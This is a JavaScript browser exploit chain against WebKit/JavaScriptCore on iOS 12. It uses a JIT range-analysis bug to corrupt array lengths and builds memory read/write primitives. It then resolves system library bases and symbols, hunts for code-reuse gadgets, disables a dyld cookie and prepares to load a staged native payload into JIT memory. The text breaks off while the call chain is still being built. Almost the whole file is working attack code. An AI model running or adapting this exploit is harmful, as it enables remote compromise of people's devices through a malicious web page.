// This is an upper limit on the number of iterations. Functions
// that need to be JITed will attempt to detect when they
// have been compiled, then break out of the compilation loop.
const ITERATIONS = 10000000;
const NUM_REGS = 32;

function hax(arr, n) {
    // Force n to be a 32bit integer.
    n |= 0;

    // Let IntegerRangeOptimization know that n will be a negative number inside the body.
    if (n < 0) {
        // Force "non-number bytecode usage" so the negation becomes unchecked and as such
        // INT_MIN will again become INT_MIN in the last iteration.
        let v = (-n)|0;

        // As n is known to be negative here, this ArithAbs will become a ArithNegate.
        // That negation will be checked, but then be CSE'd for the previous, unchecked one.
        // This is the compiler bug.
        let i = Math.abs(n);

        // However, IntegerRangeOptimization has also marked i as being >= 0...

        if (i < arr.length) {
            // .. so here IntegerRangeOptimization now believes i will be in the range [0, arr.length)
            // while i will actually be INT_MIN in the final iteration.

            // This condition is written this way so integer range optimization isn't
            // able to propagate range information (in particular that i must be a negative integer)
            // into the body.
            if (i & 0x80000000) {
                // In the last iteration, this will turn INT_MIN into an arbitrary,
                // positive number since the ArithAdd has been made unchecked by
                // integer range optimization (as it believes i to be a positive number)
                // and so doesn't bail out when overflowing int32.
                i += -0x7ffffff9;
            }

            // This condition is necessary due to the subtraction above.
            if (i > 0) {
                // In here, IntegerRangeOptimization again believes i to be in the range [0, arr.length)
                // and thus eliminates the CheckBounds node, leading to a controlled OOB access.
                // This write will the corrupt the header of the following JSArray, setting its
                // length and capacity to 0x1337.
                arr[i] = 1.04380972981885e-310;
            }
        }
    }
}

// Setup the well-known low-level exploit primitives.
function setup_addrof_fakeobj() {
    // Must have at least one non-literal in the array literals below to avoid CopyOnWrite arrays.
    let noCoW = 13.37;

    // Fill any existing holes in the heap.
    let spray = [];
    for (let i = 0; i < 10000; i++) {
        let arr = [noCoW, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6];
        spray.push(arr);
    }

    // The butterflies of these three arrays should be placed immediately after each other
    // in memory. We will corrupt the length of float_arr by OOB writing into target. Afterwards,
    // we can do easy double <-> JSValue type confusions.
    let target = [noCoW, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6];
    let float_arr = [noCoW, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6];
    let obj_arr = [{}, {}, {}, {}, {}, {}, {}];

    // Force JIT (mis)compilation and exploit the bug to corrupt the length of float_arr.
    //
    // Note: to make this even more reliable, exploit the bug for an OOB read first
    // and read some markers (i.e. some unique integer values) from the following
    // two arrays to be sure that we got the right heap layout
    // (i.e. target directly followed by float_arr directly followed by obj_arr).
    for (let i = 0; i < ITERATIONS; i++) {
        let isLastIteration = i == ITERATIONS - 1;
        let n = -(i % 10);
        if (isLastIteration) {
            n = -2147483648;
        }
        hax(target,n);
    }

    // (OOB) index into float_arr that overlaps with the first element of obj_arr.
    // Index 7 (directly behind the last element) overlaps with the header of the next butterfly.
    const OVERLAP_IDX = 8;

    let addrof = function addrof(obj) {
        obj_arr[0] = obj;
        return float_arr[OVERLAP_IDX];
    }

    let fakeobj = function fakeobj(addr) {
        float_arr[OVERLAP_IDX] = addr;
        return obj_arr[0];
    }

    return [addrof, fakeobj];
}

function follow_bl(addr) {
    var opcode = read32(addr);
    var imm = (opcode & 0x3FFFFFF) << 2;
    if (opcode & 0x2000000) {
        imm |= 0xf << 28;
    }
    addr = Add(addr, imm);
    return addr;
}


function follow_adrpLdr(addr)
{
    var op = read32(addr);
    
    var imm_hi_lo = (op >> 3)  & 0x1FFFFC;
    imm_hi_lo |= ((op >> 29) & 0x3);
    if ((op & 0x800000) != 0) {
        imm_hi_lo |= 0xFFFFFFFFFFE00000;
    }
    
    var imm = imm_hi_lo << 12;

    var ret = Add(Sub(addr, addr.lo() & 0xfff), imm);
    
    var op2 = read32(Add(addr, 4));
    var imm12 = ((op2 >> 10) & 0xFFF) << 3;
    ret = Add(ret, imm12);
    
    return ret;
}

function get_dylib_name(macho_base) {
    var lc = Add(macho_base, 0x20);
    var lc_cmd;
    while(true) {
        lc_cmd = read32(lc)
        if(lc_cmd == 0xd) { //LC_ID_DYLIB
            break;
        }

        var cmdsize = read32(Add(lc, 0x4));
        lc = Add(lc, cmdsize)
    }
    var dylib_name_offset = read32(Add(lc, 8));
    var dylib_name_addr = Add(lc, dylib_name_offset);
    var dylib_name = readString(dylib_name_addr);
    return dylib_name;
}

function obtain_dylibs_base(base, nameList) {
    var results = [];
    for (var i = 0; i < nameList.length; i++) {
        results[i] = null;
    }

    var found = 0;
    var cur   = base;

    while (cur && found < nameList.length) {
        var realName = get_dylib_name(cur);

        for (var j = 0; j < nameList.length; j++) {
            var nm = nameList[j];
            if (results[j] === null && realName.indexOf(nm) !== -1) {
                results[j] = cur;
                found++;
                log(`[+] ${nm}: ${cur}`);
            }
        }

        if (found === nameList.length) {
            break;
        }

        var vmSize = read64(Add(cur, 0x40));
        cur = Add(cur, vmSize);
    }

    return results;
}


function resolve_symbol_addresses(macho_base, names) {
    var results = [];
    for (var k = 0; k < names.length; k++) {
        results[k] = null;
    }
    var found = 0;

    var ncmds = read32(Add(macho_base, 0x10));
    var ptr = Add(macho_base, 0x20);
    var symtab_cmd = null;
    for (var i = 0; i < ncmds; i++) {
        var lc = ptr;
        var lc_cmd = read32(lc);
        if (lc_cmd == 2) {
            symtab_cmd = lc;
            break;
        }

        var lc_cmdsize = read32(Add(lc, 4));
        ptr = Add(ptr, lc_cmdsize);
    }

    ptr = Add(macho_base, 0x20);
    var text_segment = 0;
    for (var i = 0; i < ncmds; i++) {
        var sc = ptr;
        var sc_segname = readString(Add(sc, 8));
        if(sc_segname === "___TEXT") {
			text_segment = sc;
            break;
        }

        var sc_cmdsize = read32(Add(sc, 4));
        ptr = Add(ptr, sc_cmdsize);
    }
    var text_segment_vmaddr = read32(Add(text_segment, 0x18));
	var slide = Sub(macho_base, text_segment_vmaddr);

    ptr = Add(macho_base, 0x20);
	var linkedit_segment = 0;
	for (var i = 0; i < ncmds; i++) {
        var sc = ptr;
        var sc_segname = readString(Add(sc, 8));
        if(sc_segname === "___LINKEDIT") {
            linkedit_segment = sc;
            break;
        }
        var sc_cmdsize = read32(Add(sc, 4));
        ptr = Add(ptr, sc_cmdsize);
    }
    var linkedit_segment_vmaddr = read32(Add(linkedit_segment, 0x18));
    var linkedit_segment_fileoff = read32(Add(linkedit_segment, 0x28));
	var linkedit_base = Sub(Add(slide, linkedit_segment_vmaddr), linkedit_segment_fileoff);

    var string_table = Add(linkedit_base, read32(Add(symtab_cmd, 0x10)));
    var sym_table = Add(linkedit_base, read32(Add(symtab_cmd, 8)));
    var nsyms = read32(Add(symtab_cmd, 0xc));

    for (var i = 0; i < nsyms && found < names.length; i++) {
        var symtable_n_value = read64(Add(sym_table, i * 16 + 8));
        if (!symtable_n_value) {
            continue;
        }

        var strtab_offset  = read32(Add(sym_table, i * 16 + 0));
        var current_symbol_name = readString(Add(string_table, strtab_offset));

        for (var j = 0; j < names.length; j++) {
            if (results[j] === null && current_symbol_name === names[j]) {
                var addr = symtable_n_value;
                results[j] = new Int64(Sub(addr, Sub(text_segment_vmaddr, 0x100000000)) & 0xfffffffff);
                found++;
                log(`[+] ${names[j]}: ${results[j]}`);
                break;
            }
        }
    }

    return results;
}

function obtain_libcpp_base(vtab_addr) {
    var adrpldr_ZSt7nothrow_addr = Sub(vtab_addr, vtab_addr.lo() & 0xfff);
    // log(`adrpldr_ZSt7nothrow_addr: ${adrpldr_ZSt7nothrow_addr} -> ${read64(adrpldr_ZSt7nothrow_addr)}`)
    // alert(1);
    adrpldr_ZSt7nothrow_addr = Sub(adrpldr_ZSt7nothrow_addr, offsets.webcore_libcpp_ref_gadget_off);

    var try_count = 0;
    var opcode;
    while (true) {
        if(try_count > 0x1000) {
            log(`[-] failed obtain_libcpp_base`);
            return null;
        }

        opcode = read64(adrpldr_ZSt7nothrow_addr);

        // WebCore:__text:000000018AF86AA0 CB 01 00 54                             B.LT            loc_18AF86AD8
        // WebCore:__text:000000018AF86AA4 E8 EF 40 B2                             MOV             X8, #0xFFFFFFFFFFFFFFF
        // CB 01 00 54 E8 EF 40 B2 
        if(opcode == 0xB240EFE8540001CB) {
            break;
        }
        adrpldr_ZSt7nothrow_addr = Sub(adrpldr_ZSt7nothrow_addr, 0x4);
        try_count++;
    }

    try_count = 0;
    while (true) {
        if(try_count > 0x100) {
            log(`[-] failed webkit patchfinder`);
            return;
        }

        opcode = read32(adrpldr_ZSt7nothrow_addr);
        if(((opcode & 0x9F000000) >>> 0) == 0x90000000)  //Is ADRP?
            break;
            
        adrpldr_ZSt7nothrow_addr = Add(adrpldr_ZSt7nothrow_addr, 0x4);

        try_count++;
    }

    var ZSt7nothrow_ptr = follow_adrpLdr(adrpldr_ZSt7nothrow_addr);
    var libcpp_ZSt7nothrow_addr = read64(ZSt7nothrow_ptr);
    var libcpp1_base = Sub(libcpp_ZSt7nothrow_addr, libcpp_ZSt7nothrow_addr.lo() & 0xfff);

    try_count = 0;
    while (true) {
        if(try_count > 0x100) {
            log(`[-] failed webkit patchfinder`);
            return;
        }

        machoMagic = read64(libcpp1_base);

        if(machoMagic == 0x100000CFEEDFACF) {
            break;
        }
        libcpp1_base = Sub(libcpp1_base, 0x1000);
        try_count++;
    }
    return libcpp1_base;
}

function find_stackloader_gadget(libsystem_kernel_base, mach_vm_map_addr) {
    //FIND GADGETS...
    // 1. STACKLOADER
    var try_count = 0;
    var stackloader = Add(libsystem_kernel_base, mach_vm_map_addr);
    while (true) {
        if(try_count > 100) {
            log(`[-] failed find_stackloader_gadget`);
            return null;
        }

        // libsystem_kernel:__text:0000000180A61720 FD 7B 46 A9                             LDP             X29, X30, [SP,#0x60+var_s0]
        // libsystem_kernel:__text:0000000180A61724 F4 4F 45 A9                             LDP             X20, X19, [SP,#0x60+var_10]
        // libsystem_kernel:__text:0000000180A61728 F6 57 44 A9                             LDP             X22, X21, [SP,#0x60+var_20]
        // libsystem_kernel:__text:0000000180A6172C F8 5F 43 A9                             LDP             X24, X23, [SP,#0x60+var_30]
        // libsystem_kernel:__text:0000000180A61730 FA 67 42 A9                             LDP             X26, X25, [SP,#0x60+var_40]
        // libsystem_kernel:__text:0000000180A61734 FC 6F 41 A9                             LDP             X28, X27, [SP,#0x60+var_50]
        // libsystem_kernel:__text:0000000180A61738 FF C3 01 91                             ADD             SP, SP, #0x70 ; 'p'
        // libsystem_kernel:__text:0000000180A6173C C0 03 5F D6                             RET
        opcode = read64(stackloader);
        opcode2 = read64(Add(stackloader, 0x8))
        opcode3 = read64(Add(stackloader, 0x10))
        opcode4 = read64(Add(stackloader, 0x18))
        if(opcode == 0xA9454FF4A9467BFD && opcode2 == 0xA9435FF8A94457F6 && opcode3 == 0xA9416FFCA94267FA && opcode4 == 0xD65F03C09101C3FF) {
            break;
        }
        stackloader = Add(stackloader, 0x8);
        try_count++;
    }

    return stackloader;
}

function find_ldrx8_gadget(security_base, SSLGetPeerDomainName_addr) {
    var try_count = 0;
    var ldrx8 = Add(security_base, SSLGetPeerDomainName_addr);
    while (true) {
        if(try_count > 200) {
            log(`[-] failed find_ldrx8_gadget`);
            return;
        }

        // Security:__text:0000000181B5C478                 LDR             X8, [SP]
        // Security:__text:0000000181B5C47C                 STR             X8, [X19]
        // Security:__text:0000000181B5C480
        // Security:__text:0000000181B5C480 loc_181B5C480                           ; CODE XREF: _SSLGetPeerDomainName_0+2C↑j
        // Security:__text:0000000181B5C480                                         ; _SSLGetPeerDomainName_0+44↑j ...
        // Security:__text:0000000181B5C480                 LDP             X29, X30, [SP,#0x20]
        // Security:__text:0000000181B5C484                 LDP             X20, X19, [SP,#0x10]
        // Security:__text:0000000181B5C488                 ADD             SP, SP, #0x30 ; '0'
        // Security:__text:0000000181B5C48C                 RET
        opcode = read64(ldrx8);
        opcode2 = read64(Add(ldrx8, 0x8))
        opcode3 = read64(Add(ldrx8, 0x10))
        if(opcode == 0xF9000268F94003E8 && opcode2 == 0xA9414FF4A9427BFD && opcode3 == 0xD65F03C09100C3FF) {
            break;
        }
        ldrx8 = Add(ldrx8, 0x8);
        try_count++;
    }

    return ldrx8;
}

function find_dispatch_gadget(airplayreceiver_base, APAdvertiserGetTypeID_addr) {
    var try_count = 0;
    var dispatch = Add(airplayreceiver_base, APAdvertiserGetTypeID_addr);
    dispatch = Sub(dispatch, offsets.airplay_dispatch_ref_gadget_off);
    while (true) {
        if(try_count > 13000) {
            log(`[-] failed find_dispatch_gadget`);
            return null;
        }

        // A0 02 3F D6 FD 7B 43 A9 F4 4F 42 A9 F6 57 41 A9 FF 03 01 91 C0 03 5F D6
        // AirPlayReceiver:__text:00000001A9AC7958 A0 02 3F D6                             BLR             X21
        // AirPlayReceiver:__text:00000001A9AC795C FD 7B 43 A9                             LDP             X29, X30, [SP,#0x30]
        // AirPlayReceiver:__text:00000001A9AC7960 F4 4F 42 A9                             LDP             X20, X19, [SP,#0x20]
        // AirPlayReceiver:__text:00000001A9AC7964 F6 57 41 A9                             LDP             X22, X21, [SP,#0x10]
        // AirPlayReceiver:__text:00000001A9AC7968 FF 03 01 91                             ADD             SP, SP, #0x40 ; '@'
        // AirPlayReceiver:__text:00000001A9AC796C C0 03 5F D6                             RET
        opcode = read32(dispatch);
        if(opcode == 0xD63F02A0) {
            if(read32(Add(dispatch, 4)) == 0xA9437BFD && read32(Add(dispatch, 8)) == 0xA9424FF4 && read32(Add(dispatch, 12)) == 0xA94157F6 && read32(Add(dispatch, 16)) == 0x910103FF && read32(Add(dispatch, 20)) == 0xD65F03C0)
                break;
        }
        dispatch = Sub(dispatch, 4);
        try_count++;
    }
    return dispatch;
}

function find_movx4_gadget(libcpp1_base, znst3_addr) {
    var try_count = 0;
    var movx4 = Add(libcpp1_base, znst3_addr);
    while (true) {
        if(try_count > 100) {
            log(`[-] failed find_movx4_gadget`);
            return null;
        }

        // libc++.1:__text:000000018004314C E4 03 14 AA                             MOV             X4, X20
        // libc++.1:__text:0000000180043150 00 01 3F D6                             BLR             X8
        opcode = read32(movx4);
        if(opcode == 0xAA1403E4) {
            if(read32(Add(movx4, 4)) == 0xD63F0100)
                break;
        }
        movx4 = Add(movx4, 4);
        try_count++;
    }

    return movx4;
}

function find_regloader_gadget(libcpp1_base, znkst3_addr) {
    try_count = 0;
    var regloader = Add(libcpp1_base, znkst3_addr);
    while (true) {
        if(try_count > 100) {
            log(`[-] failed find_regloader_gadget`);
            return null;
        }

        // libc++.1:__text:0000000180056D18 E3 03 16 AA                             MOV             X3, X22
        // libc++.1:__text:0000000180056D1C E6 03 1B AA                             MOV             X6, X27
        // libc++.1:__text:0000000180056D20 E0 03 18 AA                             MOV             X0, X24
        // libc++.1:__text:0000000180056D24 E1 03 13 AA                             MOV             X1, X19
        // libc++.1:__text:0000000180056D28 E2 03 17 AA                             MOV             X2, X23
        // libc++.1:__text:0000000180056D2C E4 03 40 F9                             LDR             X4, [SP]
        // libc++.1:__text:0000000180056D30 00 01 3F D6                             BLR             X8
        opcode = read32(regloader);
        if(opcode == 0xAA1603E3) {
            if(read32(Add(regloader, 4)) == 0xAA1B03E6
                && read32(Add(regloader, 8)) == 0xAA1803E0
                && read32(Add(regloader, 12)) == 0xAA1303E1
                && read32(Add(regloader, 16)) == 0xAA1703E2
                && read32(Add(regloader, 20)) == 0xF94003E4
                && read32(Add(regloader, 24)) == 0xD63F0100)
                break;
        }
        regloader = Add(regloader, 4);
        try_count++;
    }
    return regloader;
}

function obtain_dyld_base(libdyld_base, dyld_process_info_notify_release_addr) {
    var __Z27setNotifyMonitoringDyldMainPFvvE_addr = Add(dyld_process_info_notify_release_addr, 4);
    var __ZL25sNotifyMonitoringDyldMain_addr = follow_adrpLdr(Add(libdyld_base, __Z27setNotifyMonitoringDyldMainPFvvE_addr));
    var __ZL25sNotifyMonitoringDyldMain = read64(__ZL25sNotifyMonitoringDyldMain_addr);

    var try_count = 0;
    var dyld_base = Sub(__ZL25sNotifyMonitoringDyldMain, __ZL25sNotifyMonitoringDyldMain.lo() & 0xfff);
    dyld_base = Sub(dyld_base, 0x7000);
    while (true) {
        if(try_count > 100) {
            log(`[-] failed obtain_dyld_base`);
            return null;
        }
        opcode = read64(dyld_base);
        if(opcode == 0x100000CFEEDFACF) {
            break;
        }
        dyld_base = Sub(dyld_base, 0x1000);
        try_count++;
    }
    return dyld_base;
}

var malloc_nogc = [];
function pwn() {
    offsets.resolve();

     let [raw_addrof, raw_fakeobj] = setup_addrof_fakeobj();

    // Convenience wrappers to use Int64
    function addrof(obj) {
        return Int64.fromDouble(raw_addrof(obj));
    }
    function fakeobj(addr) {
        return raw_fakeobj(addr.asDouble());
    }

    // Create a legit, non-CoW float array to copy a JSCell header from.
    let float_arr = [Math.random(), 1.1, 2.2, 3.3, 4.4, 5.5, 6.6];

    // Now fake a JSArray whose butterfly points to an unboxed double JSArray.
    let jscell_header = new Int64([
        0x00, 0x10, 0x00, 0x00,     // m_structureID
        0x7,                        // m_indexingType (ArrayWithDouble)
        0x23,                       // m_type
        0x08,                       // m_flags
        0x1                         // m_cellState
    ]).asDouble();

    let container = {
        jscell_header: jscell_header,
        butterfly: float_arr,
    };

    let container_addr = addrof(container);
    let fake_array_addr = Add(container_addr, 16);

    let fake_arr = fakeobj(fake_array_addr);

    // Can now simply read a legitimate JSCell header and use it.
    // However, the op_get_by_val will cache the last seen structure id
    // and use that e.g. during GC. To avoid crashing at that point,
    // we simply execute the op_get_by_val twice.
    let legit_arr = float_arr;
    let results = [];
    for (let i = 0; i < 2; i++) {
        let a = i == 0 ? fake_arr : legit_arr;
        results.push(a[0]);
    }
    jscell_header = results[0];
    container.jscell_header = jscell_header;

    // The controller array writes into the memarr array.
    let controller = fake_arr;
    let memarr = float_arr;

    // Primitives to read/write memory as 64bit floating point values.
    function read64(addr) {
        let oldval = controller[1];
        let res;
        let i = 0;
        do {
            controller[1] = addr.asDouble();
            res = memarr[i];
            addr = Sub(addr, 8);
            i += 1;
        } while (res === undefined);
        controller[1] = oldval;
        return Int64.fromDouble(res);
    }

    function write64(addr, val) {
        let oldval = controller[1];
        let res;
        let i = 0;
        do {
            controller[1] = addr.asDouble();
            res = memarr[i];
            addr = Sub(addr, 8);
            i += 1;
        } while (res === undefined);
        memarr[i-1] = val.asDouble();
        controller[1] = oldval;
    }

    function read32(addr) {
        return Sub((read64(addr).lo()), 0);
    }

    function readString(addr)
    {
      var byte = read32(addr);
      var str  = "";
      var i = 0;
      while (byte & 0xFF)
      {
        str += String.fromCharCode(byte & 0xFF);
        byte = read32(Add(addr, i));
        i++;
      }
      return str;
    }

    function malloc(sz) {
        var arr = new Uint8Array(sz);
        malloc_nogc.push(arr);
        return read64(Add(addrof(arr), 0x10));
    }

    window.read32 = read32;
    window.read64 = read64;
    window.write64 = write64;
    window.readString = readString;
    
    var spectre = (typeof SharedArrayBuffer !== 'undefined'); 
    var FPO = spectre ? 0x18 : 0x10; 

    var wrapper = document.createElement('div');
    var wrapper_addr = addrof(wrapper);
    var el_addr = read64(Add(wrapper_addr, FPO));
    var vtab_addr = read64(el_addr);
    log(`[+] Pwned Webkit! Running post-exploitation...\n\n`);

    // 1. Obtain libc++.1 base
    log(`[Stage 1] Obtaining libc++.1 base...`);
    var libcpp1_base = obtain_libcpp_base(vtab_addr);
    log(`[+] Obtained libc++.1 base: ${libcpp1_base}\n`);

    // 2. Obtain Libs Base
    log(`[Stage 2] Obtaining other dylibs base...`);
    const dylibNames = [
        "/usr/lib/system/libdyld.dylib",
        "/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore",
        "/System/Library/Frameworks/Security.framework/Security",
        "/System/Library/PrivateFrameworks/AirPlayReceiver.framework/AirPlayReceiver",
        "/usr/lib/system/libsystem_platform.dylib",
        "/usr/lib/system/libsystem_kernel.dylib",
        "/usr/lib/system/libsystem_c.dylib"
    ];
    var dylibBases = obtain_dylibs_base(libcpp1_base, dylibNames);

    var libdyld_base = dylibBases[0];
    var jsc_base = dylibBases[1];
    var security_base = dylibBases[2];
    var airplayreceiver_base = dylibBases[3];
    var libsystem_platform_base = dylibBases[4];
    var libsystem_kernel_base = dylibBases[5];
    var libsystem_c_base = dylibBases[6];
    log(`[+] Obtained other dylibs base.\n`);





    // 3. Obtain /usr/lib/dyld base...
    log(`[Stage 3] Obtaining /usr/lib/dyld base...`);

    var libdyld_symbols = [
        "__dlsym",
        "___dyld_process_info_notify_release"
    ]
    symbolsAddr = resolve_symbol_addresses(libdyld_base, libdyld_symbols);
    var dlsym_addr = symbolsAddr[0];
    var dyld_process_info_notify_release_addr = symbolsAddr[1];
    var dyld_base = obtain_dyld_base(libdyld_base, dyld_process_info_notify_release_addr);
    log(`[+] /usr/lib/dyld: ${dyld_base}`);
    log(`[+] Obtained /usr/lib/dyld base.\n`);


    // 4. Obtain func offsets from symbol name
    log(`[Stage 4] Obtaining func offsets from symbol name...`);

    var jitWriteSeparateHeaps_addr = null;
    var startOfFixedExecutableMemoryPoolImpl_addr = null;
    var memPoolStart = null;
    var memPoolEnd = null;

    var isOld12 = false;
    if(navigator.userAgent.match(/OS 12_1(_\d+)?/) || navigator.userAgent.match(/OS 12_0(_\d+)?/)) {
        isOld12 = true;
    }
    if(isOld12) {
        var jsc_symbols = [
            "___ZN3JSC29jitWriteSeparateHeapsFunctionE",    //iOS 12.0~12.5.x
            "___ZN3JSC38taggedStartOfFixedExecutableMemoryPoolE", //iOS 12.1.x or lower
            "___ZN3JSC36taggedEndOfFixedExecutableMemoryPoolE"  //iOS 12.1.x or lower
        ];

        var symbolsAddr = resolve_symbol_addresses(jsc_base, jsc_symbols);
        jitWriteSeparateHeaps_addr = symbolsAddr[0];
        memPoolStart = read64(Add(jsc_base, symbolsAddr[1]));
        memPoolEnd = read64(Add(jsc_base, symbolsAddr[2]));
    }
    else {
        var jsc_symbols = [
            "___ZN3JSC29jitWriteSeparateHeapsFunctionE",    //iOS 12.0~12.5.x
            "___ZN3JSC36startOfFixedExecutableMemoryPoolImplEv",    //iOS 12.2 or higher
        ];
        var symbolsAddr = resolve_symbol_addresses(jsc_base, jsc_symbols);
        jitWriteSeparateHeaps_addr = symbolsAddr[0];
        startOfFixedExecutableMemoryPoolImpl_addr = symbolsAddr[1];
    }

    var libsysplatform_symbols = [
        "___longjmp"
    ]
    symbolsAddr = resolve_symbol_addresses(libsystem_platform_base, libsysplatform_symbols);
    var longjmp_addr = symbolsAddr[0];

    var libsystemc_symbols = [
        "__usleep"
    ]
    symbolsAddr = resolve_symbol_addresses(libsystem_c_base, libsystemc_symbols);
    var usleep_addr = symbolsAddr[0];

    var libsystemkernel_symbols = [
        "__mach_vm_protect",
        "__mach_task_self_",
        "__mach_vm_map"
    ]
    symbolsAddr = resolve_symbol_addresses(libsystem_kernel_base, libsystemkernel_symbols);
    var mach_vm_protect_addr = symbolsAddr[0];
    var mach_task_self_addr = symbolsAddr[1];
    var mach_vm_map_addr = symbolsAddr[2];

    var security_symbols = [
        "__SSLGetPeerDomainName"
    ]
    symbolsAddr = resolve_symbol_addresses(security_base, security_symbols);
    var SSLGetPeerDomainName_addr = symbolsAddr[0];

    var airplayreceiver_symbols = [
        "__APAdvertiserGetTypeID"
    ]
    symbolsAddr = resolve_symbol_addresses(airplayreceiver_base, airplayreceiver_symbols);
    var APAdvertiserGetTypeID_addr = symbolsAddr[0];

    var libcpp1_symbols = [
        "___ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEElsEt",
        "___ZNKSt3__18time_putIcNS_19ostreambuf_iteratorIcNS_11char_traitsIcEEEEE3putES4_RNS_8ios_baseEcPK2tmPKcSC_"
    ]
    symbolsAddr = resolve_symbol_addresses(libcpp1_base, libcpp1_symbols);
    var znst3_addr = symbolsAddr[0];
    var znkst3_addr = symbolsAddr[1];
    log(`[+] Obtained func offsets.\n`);


    // 5. Find gadgets for code execution...
    log(`[Stage 5] Finding JOP gadgets for code execution...`);
    var stackloader = find_stackloader_gadget(libsystem_kernel_base, mach_vm_map_addr);
    log(`[+] stackloader gadget: ${stackloader}`);
    var ldrx8 = find_ldrx8_gadget(security_base, SSLGetPeerDomainName_addr);
    log(`[+] ldrx8 gadget: ${ldrx8}`);
    var dispatch = find_dispatch_gadget(airplayreceiver_base, APAdvertiserGetTypeID_addr);
    log(`[+] dispatch gadget: ${dispatch}`);
    var movx4 = find_movx4_gadget(libcpp1_base, znst3_addr);
    log(`[+] movx4 gadget: ${movx4}`);
    var regloader = find_regloader_gadget(libcpp1_base, znkst3_addr);
    log(`[+] regloader gadget: ${regloader}`);
    log(`[+] Obtained JOP gadgets.\n`);



    //6. We've done here, get code execution
    alert("Building JOP chain, executing stages payload!");
    log(`[Stage 6] Prepare code execution...`);
    
    // needed to bypass seperated RW, RX JIT mitigation
    
    if(!isOld12) { //iOS 12.2 or later
        var __MergedGlobals_52_addr = follow_adrpLdr(Add(jsc_base, startOfFixedExecutableMemoryPoolImpl_addr));
        __MergedGlobals_52_addr = Sub(__MergedGlobals_52_addr, jsc_base);
        log(`[+] __MergedGlobals_52: ${__MergedGlobals_52_addr}`);
        var __MergedGlobals_52 = read64(Add(jsc_base, __MergedGlobals_52_addr));
        memPoolStart = read64(Add(__MergedGlobals_52, offsets.memPoolStart));    //__MergedGlobals_52 + 0xc8
        memPoolEnd = read64(Add(__MergedGlobals_52, offsets.memPoolEnd));      //__MergedGlobals_52 + 0xd0
    }
    log(`[+] memPoolStart = ${memPoolStart}`);  
    log(`[+] memPoolEnd = ${memPoolEnd}`);
    
    var jitWriteSeparateHeaps = read64(Add(jsc_base, jitWriteSeparateHeaps_addr));  //__ZN3JSC29jitWriteSeparateHeapsFunctionE
    log(`[i] jitWriteSeparateHeaps = ${jitWriteSeparateHeaps}`);
    var longjmp = Add(libsystem_platform_base, longjmp_addr);
    var usleep = Add(libsystem_c_base, usleep_addr);
    var mach_vm_protect = Add(libsystem_kernel_base, mach_vm_protect_addr);
    var mach_task_self_ = read64(Add(libsystem_kernel_base, mach_task_self_addr));
    var dlsym = Add(libdyld_base, dlsym_addr);

    var cookieAddr = Add(dyld_base, offsets.cookieAddr);
    log(`[i] read cookie  = ${read64(cookieAddr)}`);
    write64(cookieAddr, new Int64(0));
    log(`[i] writechk  = ${read64(cookieAddr)}`);

    // JOP START !!!
    // var x19 = malloc(0x200);
    // var x8 = malloc(0x8)
    var x19 = Add(dyld_base, offsets.cookieAddr+0x200);
    var x8 = Add(dyld_base, offsets.cookieAddr+0x300);


    log(`[i] x19 = ${x19}, x8 = ${x8}`);
    write64(Add(wrapper_addr, FPO + 8), new Int64(x19));
    log(`[i] writechk ${read64(Add(wrapper_addr, FPO + 8))}`);
    write64(x19, x8);
    log(`[i] writechk ${read64(x19)}`);
    write64(x8, longjmp);
    log(`[i] writechk ${read64(x8)}`);
    
    stages.u32 = _u32;
    stages.read = _read;
    stages.readInt64 = _readInt64;
    stages.writeInt64 = _writeInt64;
    var pstart = new Int64("0xffffffffffffffff");
    var pend   = new Int64(0);
    var ncmds  = stages.u32(0x10);
    for(var i = 0, off = 0x20; i < ncmds; ++i)
    {
        var cmd = stages.u32(off);
        if(cmd == 0x19) // LC_SEGMENT_64
        {
            var filesize = stages.readInt64(off + 0x30);
            if(!(filesize.hi() == 0 && filesize.lo() == 0))
            {
                var vmstart = stages.readInt64(off + 0x18);
                var vmsize = stages.readInt64(off + 0x20);
                var vmend = Add(vmstart, vmsize);
                if(vmstart.hi() < pstart.hi() || (vmstart.hi() == pstart.hi() && vmstart.lo() <= pstart.lo()))
                {
                    pstart = vmstart;
                }
                if(vmend.hi() > pend.hi() || (vmend.hi() == pend.hi() && vmend.lo() > pend.lo()))
                {
                    pend = vmend;
                    
                }
            }
        }
        off += stages.u32(off + 0x4);
    }
    var shsz = Sub(pend, pstart);
    log(`pstart: ${pstart}, pend: ${pend}, shsz: ${shsz}`);
    if(shsz.hi() != 0)
    {
        log("fail: shsz");
    }

    var payload = new Uint8Array(shsz.lo());
    var paddr = read64(Add(addrof(stages), 0x10));
    // paddr = new Int64(paddr);
    var codeAddr = Sub(memPoolEnd, shsz);
    codeAddr = Sub(codeAddr, codeAddr.lo() & 0x3fff);
    var shslide = Sub(codeAddr, pstart);
    segs = [];
    var off = 0x20;
    for(var i = 0; i < ncmds; ++i)
    {
        var cmd = stages.u32(off);
        if(cmd == 0x19) // LC_SEGMENT_64
        {
            var filesize = stages.readInt64(off + 0x30);
            if(!(filesize.hi() == 0 && filesize.lo() == 0))
            {
                var vmaddr   = stages.readInt64(off + 0x18);
                var vmsize   = stages.readInt64(off + 0x20);
                var fileoff  = stages.readInt64(off + 0x28);
                var prots    = stages.readInt64(off + 0x38); // lo=init_prot, hi=max_prot
                if(vmsize.hi() < filesize.hi() || (vmsize.hi() == filesize.hi() && vmsize.lo() <= filesize.lo()))
                {
                    filesize = vmsize;
                }
                segs.push({
                    addr:    Sub(vmaddr, pstart),
                    size:    filesize,
                    fileoff: fileoff,
                    prots:   prots,
                });
                if(fileoff.hi() != 0)
                {
                    log("fail: fileoff");
                }
                if(filesize.hi() != 0)
                {
                    log("fail: filesize");
                }
                fileoff = fileoff.lo();
                filesize = filesize.lo();
                payload.set(stages.slice(fileoff, fileoff + filesize), Sub(vmaddr, pstart).lo());
            }
        }
        off += stages.u32(off + 0x4);
    }
    log(`codeAddr: ${codeAddr}, paddr: ${paddr}`)

    payload.u32 = _u32;
    payload.read = _read;
    payload.readInt64 = _readInt64;
    var psyms = fsyms(payload, 0, segs, ["_load"]);
    
    ////////////////////////
    var arrsz = 0x100000,
        off   =   0x1000;
    var arr   = new Uint32Array(arrsz);
    var stack = read64(Add(addrof(arr), 0x10));
    var pos = arrsz - off;
    log(`stack: ${stack}`)

    var add_call_via_x8 = function(func, x0, x1, x2, x3, x4, jump_to) {
